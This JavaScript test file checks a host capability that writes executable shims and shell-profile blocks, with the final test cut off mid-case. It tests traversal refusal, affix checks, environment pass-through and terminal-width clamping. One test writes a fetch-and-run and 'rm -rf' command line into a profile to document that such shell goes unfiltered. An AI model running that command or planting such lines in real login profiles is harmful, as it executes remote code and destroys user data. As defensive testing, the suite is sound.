/**
 * The declaration and the implementation, driven against each other.
 *
 * Before the capability split, `platform:host`'s shape was proved by the kernel's suites or by
 * nothing at all: `artifact-protocol` held the declaration and ran a parse over it,
 * `ArtifactPatform/lib/host.js` held the implementation, and the only thing that ever
 * compared them was `assemble.js`'s `checkedCall` — at runtime, on a device, for whichever
 * operation an adapter happened to call. The kernel's four host suites reach eleven of the
 * fifteen operations, so four were checked against their declared shape nowhere.
 *
 * `AGENTS.md` §3's prose table was the only other description of these operations and it
 * had already drifted — `artifact-protocol`'s own header records that it was missing three
 * of the fifteen. That is the failure this repository exists to make impossible, and this
 * file is the mechanism: it reads the *shipped* declaration — the same frozen, parsed
 * object the kernel resolves — walks every operation in it, and does to each one what
 * `checkedCall` does, validating the arguments going in and the return value coming back
 * with `contract.validate` against the schema the declaration carries. Nothing here
 * restates a shape.
 *
 * ## What the substrate is, and the exact edge of what that proves
 *
 * A host is minted with a `binDir` under the device root, the user's real shell profile,
 * and the signed `conventions` of the adapter for this device's platform. The first two
 * are real here — a temporary directory per case, and real `bare-fs` — because that is
 * what this capability *is*: `writeCommand`'s guarantee is about a filename on a disk and
 * a suite that mocked the filesystem would be asserting its own mock. The third is a plain
 * object, which is what `boot.js` hands over.
 *
 *   - **What this proves.** That the fifteen operations exist and answer in the declared
 *     shape; that a command name outside `COMMAND` cannot be written, read, listed or
 *     removed; that a suffix, prefix or shell name outside `artifact-protocol`'s classes is
 *     refused, so `<binDir>/<name><suffix>` is the whole reachable set and a traversal is
 *     unspellable rather than checked-for; that an affix disagreeing with the signed
 *     declaration is refused and that `undefined` and `null` conventions mean different
 *     things; that a shim under an existing name is refused rather than overwritten while
 *     an identical rewrite is a no-op; that a profile line carrying either delimiter is
 *     refused *before* the `profilePath` guard; that `profileEnsure` is idempotent and
 *     `profileRemove` leaves the rest of the file alone; that a width is clamped and that
 *     a console beats `ARTIFACT_COLUMNS` while an absent console does not; and that `env`
 *     asks for exactly one name and adds no fallback of its own.
 *
 *   - **What it cannot prove.** That `READABLE_ENV` holds the six names it holds — the
 *     list is `ArtifactPatform/lib/host.js`'s and it was not allowed to move, so what is
 *     asserted here is the *shape of the promise*: that `env` is a pass-through with no
 *     second source, and that the declaration's prose still names the six. It also cannot
 *     prove that `@host` is minted unscoped, that one `conventions` is resolved per device
 *     rather than per caller, that two adapters for one platform are refused before a
 *     device is reached, or that a refusal from `attach` reaches a person on stderr. Those
 *     are `chain.js`'s, `boot.js`'s and `bin/artifact.js`'s, and
 *     `ArtifactPatform/test/adapter-conventions.test.js`,
 *     `test/signed-conventions.test.js`, `test/platform-boundary.test.js`,
 *     `test/surface.test.js` and `test/entry.test.js` are still the only things that hold
 *     them.
 *
 * **And it cannot prove anything about the authority.** `THREAT-MODEL.md` §1 is this
 * contract's threat model: `writeCommand` lands the holder's bytes executable on the
 * user's `PATH` and `profileEnsure` writes unfiltered shell into a file the login shell
 * runs. Every case below is about *where* a file can land and *which* strings are refused.
 * None of them is a bound on what the bytes do, because there is none.
 *
 * ## Why the fixture is asserted before anything uses it
 *
 * The first case checks the stand-in machine against the properties the rest of the file
 * relies on — that its `env` really refuses a name off the list, and that `measure` is
 * absent unless a case asks for one. A conformance suite driving a fixture whose `env`
 * quietly started answering everything would pass every case and mean nothing.
 */
const t = require('bare-tap')
const assert = require('bare-assert')
const os = require('bare-os')
const fs = require('bare-fs')
const path = require('bare-path')

const { contract } = require('artifact-protocol')
const { DECLARATION, ID, VERSION, host, COMMAND, BEGIN, END } = require('..')

/** @type {[string, () => Promise<void> | void][]} */
const cases = []
const test = (/** @type {string} */ n, /** @type {any} */ f) => cases.push([n, f])
const json = (/** @type {any} */ v) => JSON.stringify(v)

/**
 * Narrow a thrown value, loudly.
 *
 * Duck-typed rather than `instanceof Error`, matching every other suite in this tree: a
 * value thrown across a realm boundary carries that realm's `Error.prototype` and fails
 * the host's check while being an error in every sense a test cares about. Nothing here
 * crosses a realm, and copying the strict version would be a difference between suites
 * with no argument behind it.
 *
 * @param {unknown} err
 * @returns {asserts err is Error}
 */
function threw (err) {
  const shape = /** @type {{ message?: unknown } | null | undefined} */ (err)
  assert.ok(typeof shape?.message === 'string', `threw something with no message: ${String(err)}`)
}

/** One declared operation, by name, failing loudly rather than returning undefined. */
function operation (/** @type {string} */ name) {
  const op = DECLARATION.shape.operations.find((o) => o.name === name)
  // Not `?.` and not a default. A renamed operation means every case below is exercising a
  // shape of this file's invention, which is the whole failure mode the "read the shipped
  // declaration" argument is about.
  assert.ok(op !== undefined,
    `${ID} no longer declares ${name}; it declares ` +
    DECLARATION.shape.operations.map((o) => o.name).join(', '))
  return op
}

/**
 * Do to one call exactly what `assemble.js`'s `checkedCall` does to it.
 *
 * Arguments through the declared parameter schemas, the answer through the declared return
 * schema, both with `contract.validate`, which throws on a fault. That is the point of
 * driving it this way rather than writing `assert.equal` on each shape by hand: the
 * kernel's check and this one are the *same function over the same document*, so a
 * declaration this implementation cannot satisfy fails here rather than on somebody's
 * device mid-call.
 *
 * The declared params are walked rather than the supplied args, so a call that forgot a
 * required argument is a fault and not a silent skip. `optional` is the declaration's way
 * of saying an absence is legal, and `validate` reads it.
 *
 * @param {any} instance @param {string} name @param {any[]} args
 */
async function checked (instance, name, args) {
  const op = operation(name)

  op.params.forEach((param, i) => {
    if (args[i] === undefined && param.optional === true) return
    contract.validate(args[i], param, `${ID}.${name}(${param.name})`)
  })

  const method = instance.methods[name]
  assert.equal(typeof method, 'function', `${name} is not a function on the built instance`)

  const answer = await method(...args)
  if (op.returns !== undefined) contract.validate(answer, op.returns, `${ID}.${name}() return value`)
  return answer
}

/* ───────────────────────────── the substrate ────────────────────────────── */

/**
 * The six names `ArtifactPatform/lib/host.js`'s `READABLE_ENV` holds.
 *
 * A **copy for the fixture only**, and the distinction matters enough to say twice: this
 * is not a second definition of the allow-list. The list that decides is the kernel's and
 * it was not allowed to move, because an allow-list is authority and the contained thing
 * does not name its own containment. What the copy is for is standing up a substrate that
 * behaves the way the kernel's does, so the cases below can show that this capability
 * *adds no second source* — and the last case in the file compares it against the
 * declaration's own prose, which is the only end of the promise this repo owns.
 */
const READABLE = ['HOME', 'SHELL', 'TERM', 'LANG', 'PATH', 'ARTIFACT_COLUMNS']

/** @type {string[]} */
const dirs = []

/**
 * A real directory this file will delete.
 *
 * Real, not mocked, and that is the one decision about this fixture worth arguing.
 * `writeCommand`'s guarantee is that `<binDir>/<name><suffix>` is the whole reachable set,
 * which is a claim about a path on a filesystem; a mocked `fs` would let this file assert
 * its own mock's idea of `path.join` and would pass a `..` that a real `readdir` would
 * have shown landing one directory up. `platform-network-view` could run in memory because
 * a view is a fold; this cannot, because a host is a disk.
 *
 * @param {string} tag
 */
function scratch (tag) {
  const dir = path.join(os.tmpdir(), `platform-host-${Bare.pid ?? 0}-${tag}-${dirs.length}`)
  dirs.push(dir)
  return dir
}

/**
 * A stand-in for what the kernel knows about this machine, at exactly the members
 * `lib/host.js` declares it needs.
 *
 * `env` is a **function** and refuses off-list names, which is the shape the kernel hands
 * over: the filtering happens on its side of the seam, so what arrives here is a reader
 * that already says no. A fixture that passed a plain record would let every case below
 * pass while the capability read the environment at large.
 *
 * `measure` is absent unless a case asks for one, because that is what the kernel does
 * with an injected environment — a test's environment is meant to be its whole world, and
 * "there is nothing to measure" is a fact the substrate states by withholding the
 * function.
 *
 * @param {object} [opts]
 * @param {Record<string, string>} [opts.env]
 * @param {string} [opts.binDir]
 * @param {string} [opts.profilePath]
 * @param {number | null} [opts.measured]
 * @param {any} [opts.conventions]
 * @param {string} [opts.platform]
 */
function machine (opts = {}) {
  const env = opts.env ?? {}
  /** @type {any} */
  const m = {
    platform: opts.platform ?? 'darwin',
    arch: 'arm64',
    binDir: opts.binDir ?? scratch('bin'),
    profilePath: opts.profilePath,
    env: (/** @type {string} */ name) => (READABLE.includes(name) ? env[name] ?? null : null)
  }
  // Absent, not `undefined`, when nothing is being measured — the two are the same to
  // `?.` and different to a reader, and `columns()` keys on the absence.
  if (opts.measured !== undefined) m.measure = () => opts.measured
  if ('conventions' in opts) m.conventions = opts.conventions
  return m
}

/** A host and the machine under it, so a case can look at both. @param {any} [opts] */
function built (opts) {
  const m = machine(opts)
  return { m, h: host('@host', m) }
}

/* ─────────────────────── the fixture, checked first ─────────────────────── */

test('the stand-in machine refuses an off-list name and measures nothing by default', () => {
  const m = machine({ env: { HOME: '/home/amy', SECRET: 'no' } })

  assert.equal(m.env('HOME'), '/home/amy')
  assert.strictEqual(m.env('SECRET'), null, 'the fixture answers off-list names, so nothing below tests the filter')
  assert.strictEqual(m.env('COLUMNS'), null, 'the shell variable itself must not be readable')
  assert.strictEqual(m.measure, undefined, 'the fixture measures by default, so the columns cases prove nothing')

  const measuring = machine({ measured: 200 })
  assert.equal(typeof measuring.measure, 'function')
  assert.equal(measuring.measure(), 200)

  // And the two absences of `conventions` are distinguishable on the fixture, or the two
  // cases that turn on them are asserting one thing twice.
  assert.equal('conventions' in machine(), false, 'absent means no adapter for this platform')
  assert.equal('conventions' in machine({ conventions: null }), true, 'null means an adapter that declared nothing')
})

/* ───────────────────── the surface is the declared one ──────────────────── */

test('the built instance is exactly the declared surface, no more and no less', () => {
  const { h } = built()

  // `conforms` is `artifact-protocol`'s own answer to "is there an operation here by this
  // name, bound to something callable", and it is the function the kernel uses on an
  // artifact's instance. Using it rather than a hand-rolled loop means this case cannot
  // pass a rule the kernel would fail.
  assert.equal(contract.conforms(h.methods, DECLARATION.shape).join('; '), '',
    'the implementation is missing an operation its declaration promises')

  // And the other direction, which `conforms` does not answer and which matters here more
  // than for any other capability: an *undeclared* method on a native is reachable from an
  // artifact — `assemble.js` resolves the operation list from the declaration to decide
  // what to validate, so a method with no declared shape is a method whose arguments
  // nothing checks. On the one capability that writes executable files, that is an
  // unchecked path to a filename.
  const declared = DECLARATION.shape.operations.map((o) => o.name).sort()
  const present = Object.keys(h.methods).sort()
  assert.equal(present.join(','), declared.join(','),
    `the instance offers ${present.join(',')} and declares ${declared.join(',')}`)

  assert.equal(declared.length, 15, 'the contract has fifteen operations; drive the new one rather than editing this')
})

test('the instance answers on the contract it declares, at the version it declares', () => {
  const { h } = built()

  // `targetChecks` looks the declaration up by *the contract the native says it answers
  // on*, not by the port's. A native whose `contract` string drifted from its declaration
  // would resolve no shape and go silently unchecked, which is the exact hole the platform
  // declarations were introduced to close.
  assert.equal(h.contract, ID)
  assert.equal(h.id, '@host', 'the plan\'s target name is carried through, and it is unscoped')
  assert.equal(DECLARATION.version, VERSION)
  assert.equal(ID, 'platform:host', 'the id the repo is named after')
})

/* ──────────────── every operation, driven through its shape ─────────────── */

test('every declared operation is driven and every answer validates against its schema', async () => {
  const bin = scratch('drive')
  const profile = path.join(scratch('home'), '.zshrc')
  const { h } = built({ binDir: bin, profilePath: profile, env: { SHELL: '/bin/zsh', HOME: '/home/amy' } })

  assert.equal(await checked(h, 'os', []), 'darwin')
  assert.equal(await checked(h, 'arch', []), 'arm64')
  assert.equal(await checked(h, 'shell', []), 'zsh')
  assert.equal(await checked(h, 'env', ['HOME']), '/home/amy')
  assert.strictEqual(await checked(h, 'columns', []), null)
  assert.equal(await checked(h, 'binPath', []), bin)
  assert.equal(await checked(h, 'completionPath', ['zsh']), path.join(path.dirname(bin), 'completions', 'zsh'))

  assert.equal(await checked(h, 'writeCommand', ['send', '#!/bin/sh\nexec artifact send "$@"\n']), path.join(bin, 'send'))
  assert.equal(await checked(h, 'writeCompletion', ['send', 'zsh', '#compdef send\n', { prefix: '_' }]),
    path.join(path.dirname(bin), 'completions', 'zsh', '_send'))
  assert.equal(json(await checked(h, 'listCommands', [])), json(['send']))
  assert.equal(await checked(h, 'hasCommand', ['send']), true)
  assert.equal(await checked(h, 'removeCommand', ['send']), true)

  assert.equal(await checked(h, 'profileEnsure', [['export PATH="' + bin + ':$PATH"']]), true)
  assert.ok(String(await checked(h, 'profileBlock', [])).startsWith(BEGIN))
  assert.equal(await checked(h, 'profileRemove', []), true)

  // Coverage of this file over its own subject, asserted rather than eyeballed: the
  // fifteen calls above are the fifteen declared operations. A sixteenth added to the
  // declaration fails here instead of being quietly undriven, which is the failure mode of
  // a conformance suite written as a list of cases — and is how `AGENTS.md` §3's table
  // came to be missing three of these.
  assert.equal(DECLARATION.shape.operations.length, 15,
    'an operation was added or removed; drive it above rather than editing this number')
})

/* ─────── a traversal cannot be spelled, which is the strong claim ───────── */

test('a name outside the command class is refused by every operation that takes one', async () => {
  const bin = scratch('names')
  const { h } = built({ binDir: bin })

  // `THREAT-MODEL.md` §1.4 calls this the one strong containment claim in the contract,
  // and the wording it insists on is that traversal is not *checked for* — it cannot be
  // written. So the cases are the spellings somebody would reach for, and the point is
  // that none of them is a special case in the implementation: they all fail one regex.
  const unspellable = ['../evil', '/etc/passwd', '.hidden', 'Send', 'send/../x', 'send\\x', '', 'a'.repeat(65), '-rf']
  for (const name of unspellable) {
    assert.equal(COMMAND.test(name), false, `${json(name)} is inside the command class`)

    try {
      await h.methods.writeCommand(name, 'x')
      assert.fail(`writeCommand accepted ${json(name)}`)
    } catch (err) {
      threw(err)
      assert.ok(/is not a command name: lowercase, digits and hyphens, starting with a letter/.test(err.message),
        `${json(name)}: ${err.message}`)
    }

    try {
      await h.methods.removeCommand(name)
      assert.fail(`removeCommand accepted ${json(name)}`)
    } catch (err) { threw(err) }

    // `hasCommand` answers rather than throwing, which is the declared shape: it is a
    // question, and a malformed name is not installed.
    assert.strictEqual(await checked(h, 'hasCommand', [name]), false, json(name))
  }

  // Nothing landed anywhere. Read from the parent of `binDir`, because a traversal that
  // worked would have escaped into it.
  const parent = await fs.promises.readdir(path.dirname(bin)).catch(() => [])
  assert.equal(/** @type {string[]} */ (parent).some((f) => f === 'evil' || f === 'passwd'), false, json(parent))
})

test('a suffix, prefix or shell name outside the protocol\'s classes is refused', async () => {
  const bin = scratch('affix')
  const { h } = built({ binDir: bin })

  // The three classes come from `artifact-protocol` rather than being spelled here,
  // because the same expressions validate the signed `conventions` block. What this case
  // pins is that they are actually applied, on every argument that reaches a filename —
  // the suffix is concatenated onto an already-validated name, so a class that could spell
  // a separator would turn the strong claim into a checked one.
  for (const suffix of ['/x', '..', '.', '.TOOLONGSUFFIX', '.a/b', '\\x']) {
    try {
      await h.methods.writeCommand('send', 'x', suffix)
      assert.fail(`writeCommand accepted a suffix of ${json(suffix)}`)
    } catch (err) {
      threw(err)
      assert.ok(/is not an executable suffix/.test(err.message), `${json(suffix)}: ${err.message}`)
    }
  }

  for (const shell of ['../zsh', '/zsh', 'Zsh', '.zsh', '']) {
    // `completionPath` answers null and `writeCompletion` throws, and the declaration says
    // why in as many words: asking where one goes is a question, and writing one to
    // nowhere is a mistake.
    assert.strictEqual(await checked(h, 'completionPath', [shell]), null, json(shell))
    try {
      await h.methods.writeCompletion('send', shell, 'x')
      assert.fail(`writeCompletion accepted a shell of ${json(shell)}`)
    } catch (err) {
      threw(err)
      assert.ok(/is not a shell name/.test(err.message), `${json(shell)}: ${err.message}`)
    }
  }

  for (const prefix of ['../', '/', '_-', 'A']) {
    try {
      await h.methods.writeCompletion('send', 'zsh', 'x', { prefix })
      assert.fail(`writeCompletion accepted a prefix of ${json(prefix)}`)
    } catch (err) {
      threw(err)
      assert.ok(/is not a completion prefix/.test(err.message), `${json(prefix)}: ${err.message}`)
    }
  }

  // And the legal ones land exactly where the reachable set says they do.
  assert.equal(await checked(h, 'writeCommand', ['send', 'x', '.cmd']), path.join(bin, 'send.cmd'))
  assert.equal(await checked(h, 'writeCompletion', ['send', 'zsh', 'x', { prefix: '_', suffix: '.zsh' }]),
    path.join(path.dirname(bin), 'completions', 'zsh', '_send.zsh'))
})

/* ─────── the signed declaration, and the two absences of it ─────────────── */

test('an affix that is not the one the adapter signed is refused, and the refusal names both', async () => {
  const { h } = built({ binDir: scratch('signed'), conventions: { executable: '.cmd' } })

  try {
    await h.methods.writeCommand('send', 'x', '.bat')
    assert.fail('an adapter wrote a suffix it had not declared')
  } catch (err) {
    threw(err)
    // Both spellings, because the repair is in one of two places and the implementation
    // cannot know which: the code is wrong, or the manifest is stale.
    assert.ok(/declared an executable suffix of "\.cmd" and passed "\.bat"/.test(err.message), err.message)
    assert.ok(/republish the manifest or pass what it says/.test(err.message), err.message)
  }

  assert.ok(String(await checked(h, 'writeCommand', ['send', 'x', '.cmd'])).endsWith('send.cmd'))
})

test('absent conventions and null conventions are different answers', async () => {
  // The obvious `conventions?.executable` collapses these, and collapsing them turns every
  // adapter that declares nothing into an adapter nobody checks — which is exactly the two
  // adapters in this tree that need checking most cheaply. So the distinction is asserted
  // as behaviour rather than left to the typedef.
  const none = built({ binDir: scratch('no-adapter') })
  assert.ok(String(await checked(none.h, 'writeCommand', ['send', 'x', '.cmd'])).endsWith('send.cmd'),
    'with no adapter for this platform there is nothing signed to hold anyone to')

  const silent = built({ binDir: scratch('silent-adapter'), conventions: null })
  try {
    await silent.h.methods.writeCommand('send', 'x', '.cmd')
    assert.fail('an adapter that declared no affixes was allowed to pass one')
  } catch (err) {
    threw(err)
    assert.ok(/declared an executable suffix of none and passed "\.cmd"/.test(err.message), err.message)
  }
  assert.ok(String(await checked(silent.h, 'writeCommand', ['send', 'x'])).endsWith('send'))
})

test('a shell the declaration does not list is held to the empty affixes, not left unchecked', async () => {
  // An adapter that declared `bash` and then wrote `_send` into `completions/zsh` named a
  // file it never told an admin about, which is the same fault as the wrong executable
  // suffix and not a lesser one.
  const { h } = built({ binDir: scratch('per-shell'), conventions: { completions: { bash: { suffix: '.bash' } } } })

  assert.ok(String(await checked(h, 'writeCompletion', ['send', 'bash', 'x', { suffix: '.bash' }])).endsWith('send.bash'))

  try {
    await h.methods.writeCompletion('send', 'zsh', 'x', { prefix: '_' })
    assert.fail('an undeclared shell went unchecked')
  } catch (err) {
    threw(err)
    assert.ok(/declared a zsh completion prefix of none and passed "_"/.test(err.message), err.message)
  }
})

/* ─────── first writer of a name owns it, because nobody knows who called ─── */

test('a different shim under an existing name is refused, and an identical one is a no-op', async () => {
  const bin = scratch('clobber')
  const { h } = built({ binDir: bin })

  const first = await checked(h, 'writeCommand', ['send', 'ONE'])

  // Identical is accepted, and that is not a hole: `attach` runs on every boot, a boot is
  // every command, and an adapter generates its shim deterministically — so the steady
  // state is the same bytes and a write that changes nothing cannot be a clobber.
  assert.equal(await checked(h, 'writeCommand', ['send', 'ONE']), first)
  assert.equal(String(await fs.promises.readFile(first)), 'ONE')

  try {
    await h.methods.writeCommand('send', 'TWO')
    assert.fail('a second holder replaced the bytes of a file on the user\'s PATH')
  } catch (err) {
    threw(err)
    assert.ok(/already holds a different command/.test(err.message), err.message)
    // The message has to say why this cannot simply be resolved, because the reader is an
    // operator: `@host` is one object shared by every holder and nothing carries the
    // identity of who called.
    assert.ok(/one object shared by every holder/.test(err.message), err.message)
    assert.ok(/artifact detach/.test(err.message), err.message)
  }
  assert.equal(String(await fs.promises.readFile(first)), 'ONE', 'the refusal wrote anyway')

  // Collision detection, not authorization — stated as behaviour so the limit cannot be
  // mistaken for a bound. A holder that frees the name first takes it.
  assert.equal(await checked(h, 'removeCommand', ['send']), true)
  assert.ok(String(await checked(h, 'writeCommand', ['send', 'TWO'])).endsWith('send'))
})

test('the read side recognises a form of a name a previous release wrote', async () => {
  const bin = scratch('forms')
  const { h } = built({ binDir: bin, conventions: undefined })

  await checked(h, 'writeCommand', ['send', 'x'])
  await checked(h, 'writeCommand', ['send', 'x', '.cmd'])

  // Names, not filenames, and deduplicated. This returned filenames once, which was the
  // same thing only while no suffix existed: on a device holding `send.cmd` it returned
  // nothing, `detach` fed that empty list into `removeCommand`, and it reported honestly
  // that it had removed nothing from a directory full of commands.
  assert.equal(json(await checked(h, 'listCommands', [])), json(['send']))
  assert.equal(await checked(h, 'hasCommand', ['send']), true)

  // And `removeCommand` takes no suffix precisely so `detach` can feed `listCommands`
  // straight back in without remembering what an older adapter wrote.
  assert.equal(await checked(h, 'removeCommand', ['send']), true)
  assert.equal(json(await fs.promises.readdir(bin)), json([]), 'a form of the name was stranded')

  // Removing something already gone is the desired end state, so `false` is not a failure.
  assert.strictEqual(await checked(h, 'removeCommand', ['send']), false)
  assert.equal(json(await checked(h, 'listCommands', [])), json([]))
})

test('a device nothing has attached to answers empty rather than failing', async () => {
  // A missing `binDir` is a fact about the device, and the declaration says so — "empty
  // where the directory does not exist, which is a device nothing has attached to rather
  // than an error".
  const { h } = built({ binDir: path.join(os.tmpdir(), `platform-host-absent-${Bare.pid ?? 0}`) })
  assert.equal(json(await checked(h, 'listCommands', [])), json([]))
  assert.strictEqual(await checked(h, 'hasCommand', ['send']), false)
  assert.strictEqual(await checked(h, 'removeCommand', ['send']), false)
})

/* ─────── the profile: two refused strings, and nothing else filtered ─────── */

test('a line carrying either delimiter is refused, and refused before the profile guard', async () => {
  // `MARKERS` has the leak: a line carrying `END` closed the block early, so
  // `profileRemove` cut to it and left the remainder — plus an orphan delimiter — in a file
  // the login shell runs, while `detach` reported having left no trace.
  //
  // The *order* is the part this case exists for. The marker check runs before the
  // `profilePath` guard, so the same bytes are refused on a device with no startup file
  // too. Putting it after would make one adapter's bytes throw on a zsh device and answer
  // `false` on a device with no profile — a fault that reproduces on some of a fleet.
  const noProfile = built({ binDir: scratch('no-profile') })
  assert.strictEqual(await checked(noProfile.h, 'profileEnsure', [['export PATH=x']]), false,
    'a device with no profile should answer false rather than throw')

  for (const marker of [BEGIN, END]) {
    for (const lines of /** @type {any[]} */ ([[marker], ['ok', `x ${marker} y`], marker, [`${marker}`]])) {
      try {
        await noProfile.h.methods.profileEnsure(lines)
        assert.fail(`a line carrying ${json(marker)} was accepted on a device with no profile`)
      } catch (err) {
        threw(err)
        assert.ok(/which is this platform's own/.test(err.message), err.message)
        assert.ok(/leaves the rest in a file the login shell runs/.test(err.message), err.message)
      }
    }
  }

  // The bare-string form is tolerated and deliberately not declared — the declaration says
  // a list, "because that is what every adapter in the tree passes", and a contract that
  // admitted both would have to say which one a checker holds a caller to. So the
  // tolerance is exercised here and is not driven through `checked`, which would validate
  // it against the declared array type and correctly refuse.
  const profile = path.join(scratch('str'), '.profile')
  const { h } = built({ binDir: scratch('str-bin'), profilePath: profile })
  assert.equal(await h.methods.profileEnsure('export PATH=x'), true)
  assert.ok(String(await checked(h, 'profileBlock', [])).includes('export PATH=x'))
})

test('nothing else about a line is filtered, which is the authority working as designed', async () => {
  // Stated as a case because the opposite reading is the dangerous one: two strings are
  // refused and the rest of the shell grammar is the capability. `THREAT-MODEL.md` §1 is
  // where that lives, and a suite that only showed the refusals would imply a filter.
  const profile = path.join(scratch('unfiltered'), '.zshrc')
  const { h } = built({ binDir: scratch('unfiltered-bin'), profilePath: profile })

  const shell = 'curl https://example.invalid/x.sh | sh; rm -rf "$HOME"/x; eval "$(echo id)"'
  assert.equal(await checked(h, 'profileEnsure', [[shell]]), true)
  assert.ok(String(await fs.promises.readFile(profile)).includes(shell),
    'the lines are not arbitrary shell any more, which is a change to the threat model and not a fix')
})

test('the block is maintained by replacement, and removal leaves the rest of the file alone', async () => {
  const home = scratch('profile')
  const profile = path.join(home, '.zshrc')
  await fs.promises.mkdir(home, { recursive: true })
  await fs.promises.writeFile(profile, 'export EDITOR=vi\n')

  const { h } = built({ binDir: scratch('profile-bin'), profilePath: profile })

  assert.equal(await checked(h, 'profileEnsure', [['export PATH=one']]), true)
  assert.equal(await checked(h, 'profileEnsure', [['export PATH=one']]), true)
  assert.equal(await checked(h, 'profileEnsure', [['export PATH=two']]), true)

  const text = String(await fs.promises.readFile(profile))
  // One block, not three. `attach` runs on every boot and a boot is currently every
  // command, so an appending implementation would grow this file several times a minute.
  assert.equal(text.split(BEGIN).length - 1, 1, text)
  assert.equal(text.split(END).length - 1, 1, text)
  assert.ok(text.includes('export PATH=two') && !text.includes('export PATH=one'), text)
  assert.ok(text.startsWith('export EDITOR=vi'), 'the user\'s own line moved')

  assert.equal(await checked(h, 'profileRemove', []), true)
  const after = String(await fs.promises.readFile(profile))
  assert.equal(after.includes(BEGIN), false, after)
  assert.ok(after.includes('export EDITOR=vi'), 'removal took the user\'s line with it')
  assert.strictEqual(await checked(h, 'profileBlock', []), null)

  // True for a profile that had no block: the end state is the same and only the device
  // fact differs, which is what the declaration says.
  assert.equal(await checked(h, 'profileRemove', []), true)
})

test('a device with no profile answers false three ways rather than failing', async () => {
  const { h } = built({ binDir: scratch('profileless') })
  assert.strictEqual(await checked(h, 'profileEnsure', [['export PATH=x']]), false)
  assert.strictEqual(await checked(h, 'profileRemove', []), false)
  assert.strictEqual(await checked(h, 'profileBlock', []), null)
})

/* ─────── the width, and the ordering between two sources of it ───────────── */

test('a width is clamped, and an unusable one reads as null rather than as a number', async () => {
  // The clamp was three byte-identical copies, one per adapter, and 20/1000 was never
  // platform knowledge — it is arithmetic a renderer has to survive. `ARTIFACT_COLUMNS` is
  // a string out of a user's environment, so it is not merely possibly wrong: a `text@1`
  // renderer builds a rule per framed panel, so `1000000000` throws `Invalid string
  // length` from the middle of a render, which reads as the platform being broken.
  const at = (/** @type {string} */ claim) =>
    host('@host', machine({ env: { ARTIFACT_COLUMNS: claim } })).methods.columns()

  assert.equal(at('120'), 120)
  assert.equal(at('20'), 20, 'the floor is a width, not a rejection')
  assert.strictEqual(at('19'), null)
  assert.equal(at('10000000'), 1000)
  assert.equal(at('1000000000'), 1000)
  assert.strictEqual(at('abc'), null)
  assert.strictEqual(at(''), null)
  assert.strictEqual(at('-1'), null)
  assert.equal(at('80.7'), 80, 'a width is whole')

  // Driven through the declared schema too, because `nullable: true` on a number is a
  // checked claim and not a note.
  assert.equal(await checked(host('@host', machine({ env: { ARTIFACT_COLUMNS: '120' } })), 'columns', []), 120)
})

test('a console beats the environment, and an absent console does not', async () => {
  // It reads backwards until you notice who sets `ARTIFACT_COLUMNS`: the *shim* does, from
  // `${COLUMNS:-$(tput cols)}`. Treating it as an override would mean a shell's guess —
  // possibly stale, possibly 80 because `tput` is not installed — silently beating a live
  // measurement of the very terminal being written to.
  const measured = host('@host', machine({ env: { ARTIFACT_COLUMNS: '80' }, measured: 200 }))
  assert.equal(await checked(measured, 'columns', []), 200, 'the environment beat the console')

  // An unusable measurement falls back rather than answering null, so a 10-column console
  // is not worse than no console at all.
  const tiny = host('@host', machine({ env: { ARTIFACT_COLUMNS: '120' }, measured: 10 }))
  assert.equal(await checked(tiny, 'columns', []), 120)

  const nothingToMeasure = host('@host', machine({ env: { ARTIFACT_COLUMNS: '90' }, measured: null }))
  assert.equal(await checked(nothingToMeasure, 'columns', []), 90)

  // And the case the kernel expresses by withholding `measure` entirely: a suite's
  // injected environment is its whole world, so nothing underneath is consulted.
  const injected = host('@host', machine({ env: { ARTIFACT_COLUMNS: '90' } }))
  assert.equal(await checked(injected, 'columns', []), 90)
  assert.strictEqual(host('@host', machine({})).methods.columns(), null,
    'it measured something the substrate never offered')
})

/* ─────── env: the promise this repo makes about a list it does not hold ──── */

test('env asks for one name and adds no second source of its own', async () => {
  // The list that decides is `ArtifactPatform/lib/host.js`'s `READABLE_ENV` and ROADMAP
  // It was not allowed to move: an allow-list is *authority*, and letting the contained
  // thing name what it may read is letting it write its own containment. A capability repo
  // naming its own list is one step nearer that mistake, not further from it.
  //
  // So what this case can prove is the half this repo owns — that `env` is a pass-through
  // with no fallback. A substrate that refuses everything must make `env` answer null for
  // everything, including the two names the implementation reads for its own purposes.
  const closed = host('@host', {
    platform: 'darwin',
    arch: 'arm64',
    binDir: scratch('closed'),
    env: () => null
  })

  for (const name of [...READABLE, 'SECRET', 'COLUMNS', 'AWS_SECRET_ACCESS_KEY']) {
    assert.strictEqual(await checked(closed, 'env', [name]), null, name)
  }
  assert.strictEqual(await checked(closed, 'shell', []), null, 'shell() found a second source for SHELL')
  assert.strictEqual(await checked(closed, 'columns', []), null, 'columns() found a second source for ARTIFACT_COLUMNS')

  // And the reverse: a substrate that answers is not second-guessed either. `env` returns
  // what it was given, so a name the kernel allows is not filtered again here.
  const open = host('@host', {
    platform: 'darwin',
    arch: 'arm64',
    binDir: scratch('open'),
    env: (name) => `value-of-${name}`
  })
  assert.equal(await checked(open, 'env', ['HOME']), 'value-of-HOME')
  assert.equal(await checked(open, 'env', ['SECRET']), 'value-of-SECRET',
    'this file filters names, which duplicates the kernel\'s authority in a repo that must not hold it')
})

test('the declaration still names the six the kernel enforces', () => {
  // The other end of that promise, and the only end this repo can hold. `env`'s
  // description lists the six names, every device reads that text through
  // `platform:documentation`, and the list that decides is next door. A seventh name added
  // in the kernel and not here is a promise the platform has outgrown; a seventh named here
  // and not in the kernel is one it cannot keep. Either way one of the two suites fails —
  // this one, or `ArtifactPatform/test/platform-boundary.test.js`, which drives the real
  // reader.
  const said = String(operation('env').params[0].description)
  for (const name of READABLE) {
    assert.ok(said.includes(name), `the declaration no longer names ${name}: ${said}`)
  }
  assert.ok(/anything else answers null/.test(said), said)

  // Six and not five or seven, so a name silently dropped from the prose fails here.
  const named = READABLE.filter((n) => said.includes(n))
  assert.equal(named.length, 6, `the description names ${named.length} of the six`)
})

/* ─────────────────── the declaration is the shipped one ─────────────────── */

test('the shipped declaration is parsed, frozen, and in the platform namespace', () => {
  // The case that would notice this file testing a shape of its own invention, and the
  // case that would notice the declaration having stopped going through
  // `artifact-protocol`'s parser — which is what makes it the same kind of object a
  // manifest's declaration is, rather than an object literal that looks like one.
  assert.equal(ID.startsWith('platform:'), true)
  assert.equal(Object.isFrozen(DECLARATION), true, 'a consumer could edit the platform\'s promise')

  // `parseShape` normalises and refuses; re-parsing what it produced has to be a fixed
  // point, and if it throws then what the kernel resolves is not what this package
  // validated at load.
